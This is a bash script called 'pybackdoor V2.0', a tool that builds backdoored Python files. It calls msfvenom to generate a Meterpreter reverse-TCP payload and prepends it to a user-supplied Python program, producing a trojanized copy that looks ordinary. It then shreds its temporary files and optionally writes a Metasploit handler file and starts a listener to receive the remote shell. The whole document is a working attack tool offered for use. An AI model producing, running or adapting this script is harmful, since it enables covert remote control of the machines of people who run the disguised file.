#!/bin/bash
# pybackdoor V2.0
# colors
green=$'\e[0;32m'
red=$'\e[1;31m'
yellow=$'\e[1;33m'
blue=$'\e[1;34m'
cyan=$'\e[0;36m'
lightgreen=$'\e[1;32m'
white=$'\e[1;37m'
STOP="\e[0m"

sleep 0.7
echo ""
echo "$green[ + ] Starting Service ..." | pv -qL 9
echo ""
sleep 1.5
clear
printf "$cyan"
figlet -f big PYBACKDOOR
printf "$STOP"
echo ""
read -p "$cyan[ + ] LHOST : " lh
echo ""
read -p "$cyan[ + ] LPORT : " lp
echo ""
read -p "$cyan[ + ] path to Original File $lightgreen[ PYTHON ] $cyan: " pyfile
echo ""
read -p "$cyan[ + ] Name File $red[ WARNING WITHOUT EXTENSION .py ] $cyan: " pyname
echo ""
sleep 0.7
if [ -f $pyfile ]; then
        echo "$lightgreen[ + ] File $(basename $pyfile) Found!"
        echo ""
else
        echo "$red[ - ] File $(basename $pyfile) Not Found!"
        echo "" 
	echo "$red[ - ] Exiting ..." | pv -qL 10
        echo ""
        sleep 0.5
exit
fi
sleep 0.5
echo "$lightgreen[ * ] Generating the backdoor ..." | pv -qL 10
echo ""
xterm -T "Creating Backdoor ..." -e "msfvenom -p python/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -o temp.txt" & > /dev/null2>&1
PID=$!
wait $PID
sleep 1
echo "$lightgreen[ # ] Encrypting shellcode ..." | pv -qL 10
echo ""
cat temp.txt > $pyname.py
echo '' >> $pyname.py
cat $pyfile >> $pyname.py
sleep 0.5
echo "$lightgreen[ + ] Shellcode encrypted ..." | pv -qL 10
echo ""
sleep 1
echo "$lightgreen[ + ] Backdoor saved in folder --> $PWD/$pyname.py" | pv -qL 10
echo ""
sleep 1.5
echo "$lightgreen[ + ] Cleaning up ... " | pv -qL 10
echo ""
shred -n 5 temp.txt -u
echo "$lightgreen[ + ] OK ... " | pv -qL 10
echo ""
echo ""
sleep 1.1
x=0
while [ $x = 0 ]
do
read -p "$yellow[ ? ] Do you want to start Listener? [ Y/n ] : " listener1
	case "$listener1" in
n)
echo '' && exit
;;
Y)
echo ""
sleep 0.7
echo "$lightgreen[ + ] Creating handler.rc file ..." | pv -qL 10
echo ""
sleep 0.5
touch handler.rc && chmod 777 handler.rc
echo use exploit/multi/handler >> handler.rc
echo set payload python/meterpreter/reverse_tcp >> handler.rc
echo set LHOST $lh >> handler.rc
echo set LPORT $lp >> handler.rc
echo exploit >> handler.rc
echo "$lightgreen[ + ] handler.rc created successfully ..." | pv -qL 10
echo ""
sleep 1
echo "$blue[ + ] Starting Metasploit ... " | pv -qL 10
echo ""
sleep 0.8
msfconsole -r handler.rc
echo ""
echo ""
echo "$lightgreen[ + ] Cleaning handler.rc ... " | pv -qL 10
echo ""
shred -n 5 handler.rc -u
echo "$lightgreen[ + ] OK ..." | pv -qL 10
echo ""
sleep 1.1
exit
esac
done

